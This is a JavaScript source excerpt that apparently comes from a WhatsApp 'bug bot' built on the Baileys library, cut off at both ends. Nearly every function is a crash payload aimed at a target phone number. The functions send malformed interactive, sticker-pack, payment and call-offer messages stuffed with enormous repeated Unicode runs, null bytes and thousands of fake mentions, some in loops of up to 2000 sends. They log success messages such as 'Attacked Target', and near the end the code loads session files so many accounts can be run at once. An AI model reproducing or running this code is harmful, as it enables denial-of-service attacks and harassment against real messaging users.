attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": sock.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
}] : [])
]
}]
};
await sock.sendNode(lemiting);
}

async function odx(sock, target) {
    const aa = "𑜦𑜠".repeat(20000) + "𑜦𑜠".repeat(60000);
    
    let msg = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "QxkYuxM0qMDgqUK5WCi91bKWGFDoHhNNkrRlfMNEjTo=",
                    fileLength: "999999999999",
                    height: 999999999,
                    width: 999999999,
                    mediaKey: "prx9yPJPZEJ5aVgJnrpnHYCe8UzNZX6/QFESh0FTq+w=",
                    fileEncSha256: "zJgg0nMJT1uBohdzwDXkOxaRlQnhJZb+qzLF1lbLucc=",
                    directPath: "/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1762488513",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAtAAACAwEAAAAAAAAAAAAAAAAABAIDBQEBAQEBAAAAAAAAAAAAAAAAAAABEv/aAAwDAQACEAMQAAAAQgzOsuOtNHI6YZhpxRWpeubdXLKhm1ckeEqlp6CS4B//xAAkEAACAwABAwQDAQAAAAAAAAABAgADEQQSFEETMUFREDJCUv/aAAgBAQABPwDtVC4riLw6zvU8bitpzI1Tge0FQW1ARgjUKOSVzwZZxwjosoqSpQp8ndyXUNYQ31DxrS4eNxrGsDmcjju7KyjzD+G8TcG7H5PSPE7m2dwzIwM63/1P3c/QlrqkqAdfqehn9CLfWPacy0m3QYrM1S4fM67x8iBg3zkZAf6muAMMc2fJgvOZk9YzuW9sh5BzMn//xAAXEQEBAQEAAAAAAAAAAAAAAAARAAEg/9oACAECAQE/ACJmLNOf/8QAGREBAQADAQAAAAAAAAAAAAAAAREAAhBC/9oACAEDAQE/ADaNg5cdVJZhqnpeJeV7/9k=",
                    caption: aa,  
                    contextInfo: {
                        mentionedJid: [
                            ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 5000000) + "917267@s.whatsapp.net"),
                        ],
                        isForwarded: true,
                        forwadingScore: 999,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "696969696969@newsletter",
                            serverMessageId: 1,
                            newsletterName: "pinjem ven",
                        }
                    }
                }
            }
        }
    };

    const ondet = generateWAMessageFromContent(target, msg, {});

    await sock.relayMessage("status@broadcast", ondet.message, {
        messageId: ondet.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    let msg2 = {
        ephemeralMessage: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "𑜦𑜠".repeat(20000),
                                format: "DEFAULT",
                            },
                            contextInfo: {
                                mentionedJid: [
                                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 5000000) + "917267@s.whatsapp.net"),
                                ],
                                isForwarded: true,
                                forwadingScore: 999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "696969696969@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "pinjem ven",
                                }
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "{}".repeat(30000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }; 

    const tai = generateWAMessageFromContent(target, msg2, {});

    await sock.relayMessage("status@broadcast", tai.message, {
        messageId: tai.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
}

async function imverus(sock, target) {
try {
let message = {
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "Korzz Is Here",
},

contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
},

nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: "\u0000".repeat(7000),
},
{
name: "call_permission_request",
buttonParamsJson: "\u0000".repeat(1000000),
},
{
name: "mpm",
buttonParamsJson: "\u0000".repeat(7000),
},
{
name: "mpm",
buttonParamsJson: "\u0000".repeat(7000),
}
],
}
},

messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
},
},
};

await sock.relayMessage(
target,
message,
{ participant: { jid: target } }
);

} catch (err) {
console.log("Korz4You Im Bak:", err);
}
}
async function InVisible(sock, target) {
            const msg = {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "𝐊𝐎𝐑𝐙𝐙 𝐈𝐒 𝐇𝐄𝐑𝐄" + "ꦽ".repeat(696),
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{ "${'\u0000'.repeat(1045000)}" }`,
                                version: 3
                            }
                        },
                        contextInfo: {
                            remoteJid: "-t.me/RazaModsGantengBett",
                            stanzaId: "666",
                            participant: target,
                            forwardingScore: 9999,
                            isSampled: true,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterName: "#SyrenV7Pro.json" + "ꦽ".repeat(65000),
                                newsletterJid: "1@newsletter",
                                serverMessageId: 1
                            },
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        }
                    }
                }
            };

            await sock.relayMessage("status@broadcast", msg, {
                messageId: Date.now().toString(),
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{ tag: "to", attrs: { jid: target }, content: [] }]
                            }
                        ]
                    }
                ]
            });
            await new Promise(r => setTimeout(r, 1000));
        }
        
async function StickerPackFreeze(sock, target) {
  const stickerPack = await generateWAmessageFromContent(target, {
    extendedTextMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "642f1c7a-094d-4ea7-82aa-d283952a4322",
          name: 'https://Wa.me/stickerpack/ErlanggaOfficial',
          publisher: "ErlanggaOfficial",
          stickers: [
            {
              fileName: "hH9-mjYyzRiKyN89WuVcxbgidYdQeGjBxQeUfz3NVQ4=.webp",
              isAnimated: true,
              emojis: ["😠"],
              accessibilityLabel: 'ꦾ'.repeat(1222),
              isLottie: false,
              mimetype: "image/webp"
            },
            {
              fileName: "jpxNv2Sd1s6fL5-HnkMrNQY3XbN0YLO4th8uwwgl4dA=.webp",
              isAnimated: true,
              emojis: ["😠"],
              accessibilityLabel: 'ꦾ'.repeat(1222),
              isLottie: false,
              mimetype: "image/webp"
            },
            {
              fileName: "RrPMKWCtHlOwjp97mAglUYPIaJWYtVPmndIVDLDX96g=.webp",
              isAnimated: true,
              emojis: ["😠"],
              accessibilityLabel: 'ꦾ'.repeat(1222),
              isLottie: false,
              mimetype: "image/webp"
            }
          ],
          fileLength: 959168,
          fileSha256: "R45kqbx/nwvhGMMqLkD49f1ggQ9anc07PNnmx6TvoNE=",
          fileEncSha256: "iiZJfuiGEdzzsXqOM3gzdFVgpz1MyY0GPMP7UAYGnZI=",
          mediaKey: "GJAqSOkifR6DPqViXuBJ8P3+/NkzhsWH6EEuYTySJ4s=",
          directPath: "/v/t62.15575-24/542959707_546680258506540_609965180471151393_n.enc",
          mediaKeyTimestamp: 1756908899,
          trayIconFileName: "642f1c7a-094d-4ea7-82aa-d283952a4322.png",
          thumbnailDirectPath: "/v/t62.15575-24/542690545_4192380777713097_4091855665882100743_n.enc",
          thumbnailSha256: "yXthaTViH0AaN5zl4KC6nd/MJcIW2TdUPMDeeHsNdSg=",
          thumbnailEncSha256: "UDvv/9QVJLPYZ1VFrAmiD1CEDVZYIHmmxfg/fx8HN6Y=",
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: "ZDNjZWEwMjk3MGY3MzA5MGE0MzU3YzIwZDI1YmQyYjZlNWNjMGYxZjAwODUzNzYxMTUxN2NiYmI3NDExYTdjZQ==",
          stickerPackSize: 961398,
          stickerPackOrigin: "USER_CREATED"
        },
        contextInfo: {
          isForwarded: true,
          forwardingScore: 9999,
          businessMessageForwardInfo: {
            businessOwnerJid: "6288905301692@s.whatsapp.net",
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ]
          },
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "ErlanggaOfficial 🗡️",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                buttons: [
                  {
                    name: "payment_method",
                    buttonParamsJson: JSON.stringify({
                      reference_id: null,
                      payment_method: "\u0010".repeat(0x2710),
                      payment_timestamp: null,
                      share_payment_status: true
                    })
                  }
                ],
                messageParamsJson: "{}"
              }
            }
          }
        }
      }
    }
  });

  for (let i = 0; i < 2000; i++) {
    await sock.relayMessage(target, stickerPack.message, {
      additionalNodes: [{ tag: "biz", attrs: { native_flow_name: "payment_method" } }],
      messageId: stickerPack.key.id,
      participant: { jid: target },
      userJid: target
    });
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
  
  await sock.relayMessage("status@broadcast", stickerPack.message, {
    messageId: stickerPack.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { native_flow_name: "payment_method" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  console.log(chalk.bold(`Succes Sending StickerFreeze To ${target}`));
}

async function nyetrumAnying(sock, target) {
  try {
    const jid = String(target).includes("@s.whatsapp.net")
      ? String(target)
      : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

    const messegpler = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async (prev) => {
            try {
              await prev;
            } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    const plerkuu = messegpler();

    const warbuffer = (buf) =>
      Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);

    const kntolz = encodeSignedDeviceIdentity;

    sock.createParticipantNodes = async (
      recipientJids,
      message,
      extraAttrs,
      dsmMessage
    ) => {
      if (!recipientJids.length) {
        return { nodes: [], shouldIncludeDeviceIdentity: false };
      }

      const patched =
        (await sock.patchMessageBeforeSending?.(
          message,
          recipientJids
        )) ?? message;

      const faxzvcr = Array.isArray(patched)
        ? patched
        : recipientJids.map((j) => ({
            recipientJid: j,
            message: patched
          }));

      const { id: meId, lid: meLid } = sock.authState.creds.me;
      const jembut = meLid ? jidDecode(meLid)?.user : null;

      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        faxzvcr.map(async ({ recipientJid: j, message: msg }) => {
          const { user: targetUser } = jidDecode(j);
          const { user: ownUser } = jidDecode(meId);

          const isOwn =
            targetUser === ownUser || targetUser === jembut;

          const y = j === meId || j === meLid;
          if (dsmMessage && isOwn && !y) msg = dsmMessage;

          const bytes = warbuffer(
            kntolz ? kntolz(msg) : Buffer.from([])
          );

          return plerkuu.mutex(j, async () => {
            const { type, ciphertext } =
              await sock.signalRepository.encryptMessage({
                jid: j,
                data: bytes
              });

            if (type === "pkmsg") {
              shouldIncludeDeviceIdentity = true;
            }

            return {
              tag: "to",
              attrs: { jid: j },
              content: [
                {
                  tag: "enc",
                  attrs: { v: "2", type, ...extraAttrs },
                  content: ciphertext
                }
              ]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    let devices = [];

    try {
      devices = (
        await sock.getUSyncDevices([jid], false, false)
      ).map(({ user, device }) =>
        `${user}${device ? ":" + device : ""}@s.whatsapp.net`
      );
    } catch {
      devices = [jid];
    }

    try {
      await sock.assertSessions(devices);
    } catch {}

    let destinations = [];
    let shouldIncludeDeviceIdentity = false;

    try {
      const created = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: "0" }
      );

      destinations = created?.nodes ?? [];
      shouldIncludeDeviceIdentity =
        !!created?.shouldIncludeDeviceIdentity;
    } catch {}

    const wartefax = {
      tag: "call",
      attrs: {
        to: jid,
        id:
          sock.generateMessageTag?.() ??
          crypto.randomBytes(8).toString("hex"),
        from:
          sock.user?.id ||
          sock.authState?.creds?.me?.id
      },
      content: [
        {
          tag: "offer",
          attrs: {
            "call-id": crypto
              .randomBytes(16)
              .toString("hex")
              .slice(0, 64)
              .toUpperCase(),
            "call-creator":
              sock.user?.id ||
              sock.authState?.creds?.me?.id
          },
          content: [
            { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
            { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
            {
              tag: "video",
              attrs: {
                orientation: "0",
                screen_width: "1920",
                screen_height: "1080",
                device_orientation: "0",
                enc: "vp8",
                dec: "vp8"
              }
            },
            { tag: "net", attrs: { medium: "3" } },
            {
              tag: "capability",
              attrs: { ver: "1" },
              content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
            },
            { tag: "encopt", attrs: { keygen: "2" } },
            {
              tag: "destination",
              attrs: {},
              content: destinations
            }
          ]
        }
      ]
    };

    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
      try {
        const deviceIdentity = encodeSignedDeviceIdentity(
          sock.authState.creds.account,
          true
        );

        wartefax.content[0].content.push({
          tag: "device-identity",
          attrs: {},
          content: deviceIdentity
        });
      } catch {}
    }

    await sock.relayMessage(
      target,
      {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          requestFrom: target,
          expiryTimestamp: null,
          contextInfo: {
            remoteJid: " X ",
            isForwarded: true,
            forwardingScore: 9999,
            externalAdReply: {
              title: "pler berdasi",
              body: "pler berdasi",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewTtpe: "VIDEO",
              sourceUrl: "https://t.me/xwarrxxx",
              mediaUrl: "https://t.me/xwarrxxx",
              showAdAttribution: true
            }
          }
        }
      },
      {
        participant: { jid: target },
        quoted: null,
        useraJid: null,
        messageId: null
      }
    );

    await sock.sendNode(wartefax);
  } catch {}
}

async function PouButtonUi(sock, target) {
for (let i = 0; i < 100; i++) {
const PouMsg = {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥",
hasMediaAttachment: false
},
body: {
text: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥" + "ꦽ".repeat(3000) + "ꦾ".repeat(3000)
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(5000),
limited_time_offer: {
text: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥",
url: "t.me/PouSkibudi",
copy_code: "𝐊𝐚͠𝐦𝐢͜𝐲𝐚 𝐈͠𝐬͜ 𝐁͠𝐚͜𝐜͠𝐤",
expiration_time: Date.now() * 999
},
buttons: [
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
id: null
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
})
},
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
copy_code: "𑜦𑜠".repeat(10000)
})
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "PROMOTION",
flow_cta: "𝐊𝐚͠𝐦𝐢͜𝐲𝐚 𝐈͠𝐬͜ 𝐁͠𝐚͜𝐜͠𝐤",
flow_message_version: "3"
})
}
]
},
contextInfo: {
mentionedJid: Array.from({ length: 1000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
isForwarded: true,
forwardingScore: 999
}
}
}
}
}
await sock.relayMessage(target, PouMsg)
}
}

async function UiSystem(sock, target) {
  try {
    const img = {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
      fileLength: "62265",
      height: 1080,
      width: 1080,
      mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
      fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
      directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
      mediaKeyTimestamp: "1756530813",
      jpegThumbnail: Buffer.from(
        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFExQiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
        "base64"
      ),
      contextInfo: {},
      scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
      scanLengths: [7808, 22667, 9636, 22154],
      midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
    };

    await Joo.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: 
                      `7ooModdss Was Here!\n` +
                      "\u0000" +
                      "ꦾ".repeat(90000),
                  },
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          hasMediaAttachment: true,
                          imageMessage: img,
                        },
                        body: {
                          text: "\u0000" + "ꦾ".repeat(900000),
                        },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson: `{"display_text":"Section ${"ꦾ".repeat(900)}","url":"https://t.me/Jcodeest4r","merchant_url":"https://google.com"}`,
                            },
                            {
                              name: "single_select",
                              buttonParamsJson: `{"title":"Section ${"ꦾ".repeat(900)}","sections":[{"title":"Janda","rows":[]}]}`,
                            },
                            {
                              name: "quick_reply",
                              buttonParamsJson: `{"display_text":"Section ${"ꦾ".repeat(9000)}","title":"Crash","id":".clickme"}`,
                            },
                          ],
                        },
                      },
                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        mentions: ["13135550002@s.whatsapp.net"],
      }
    );

    console.log(chalk.red.bold("System UI Succesfuly Attacked Target"));
  } catch (error) {
    console.error("An error occurred:", error);
  }
}

async function UiAttack(sock, target) {
  sock.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "KorzzMods iZin Tampil\n\n" + "ꦽ".repeat(50000) + "@5".repeat(50000),
          hasMediaAttachment: false
        },
        body: {
          text: "Awas Memek",
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            { name: "single_select", buttonParamsJson:  "\u0000" },
            { name: "payment_method", buttonParamsJson:  "\u0000" },
            { name: "call_permission_request", buttonParamsJson:  "\u0000", voice_call: "call_galaxy" },
            { name: "form_message", buttonParamsJson:  "\u0000" },
            { name: "catalog_message", buttonParamsJson:  "\u0000" },
            { name: "send_location", buttonParamsJson:  "\u0000" },
            { name: "view_product", buttonParamsJson:  "\u0000" },
            { name: "payment_status", buttonParamsJson: "\u0000" },
            { name: "cta_call", buttonParamsJson: "\u0000" },
            { name: "cta_url", buttonParamsJson:  "\u0000" },
            { name: "review_and_pay", buttonParamsJson:  "\u0000" }
          ]
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function BlankXUi(sock, target) {
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

  try {
    const msg1 = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "666@newsletter",
            newsletterName: "꧔".repeat(10000) + "\u0000".repeat(10000),
            caption: "\u0000".repeat(20000) + "ោ៝".repeat(60000),
            inviteExpiration: Date.now() + 9999999999
          }
        }
      }
    };

    await sock.relayMessage(target, msg1.message, {
      messageId: sock.generateMessageTag(),
      userJid: target
    });

    await sleep(100);

    const msg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(2500) + "ោ៝".repeat(3000)
                },
                {
                  name: "camera_permission_request",
                  buttonParamsJson: "ោ៝".repeat(4000)
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(3000)
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                    title: "ោ៝".repeat(2000)
                  })
                }
              ]
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
              ],
              stanzaId: sock.generateMessageTag(),
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg2.message, {
      messageId: sock.generateMessageTag(),
      userJid: target
    });
  } catch (err) {}
}

//no share abangkuh

async function efcixblenk(sock, target) {
    const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 70000) + "@s.whatsapp.net")
              ],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimeStamp: Math.floor(Date.now())
                }
              },
              externalAdReply: {
                renderLargerThumbnail: true,
                thumbnailUrl: "https://wa.me/stickerpack/Xwarrxxx",
                sourceUrl: "https://t.me/Xwarrxxx",
                showAdAttribution: true,
                body: "Korzz Nih Bos Izin Tampil",
                title: "Korzz Nih Bos Izin Tampil"
              }
            },
            body: {
              text: "Pler lu" + "ꦾ".repeat(45000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  
  let julexsapri = "ꦾ".repeat(1500);
  const jule = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'DOLAR',
      requestFrom: target, 
      expiryTimestamp: Date.now() + 8000, 
      amount: {
        value: 999999999, 
        offset: 100, 
        currencyCode: 'IDR'
      },
      contextInfo: {
        externalAdReply: {
          title: "Korzz Nih Bos Izin Tampil",
          body: julexsapri,
          mimetype: 'audio/mpeg',
          caption: julexsapri,
          showAdAttribution: true,
          sourceUrl: 'michat.id',
          thumbnailUrl: 'https://files.catbox.moe/wa3n2q.jpg'
        }
      }
    }
  };
  
  await sock.relayMessage(target, jule, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
  
  console.log(chalk.red.bold("SUCCES SENDING BUG")); 
}
// ======================================= //
// WhatsApp Connect Logic
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Error preparing auth folders:", err.message);
    return [];
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        keepAliveIntervalMs: 50000,
        logger: pino({ level: "silent" }),
        auth: state,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        generateHighQualityLinkPreview: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        version
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
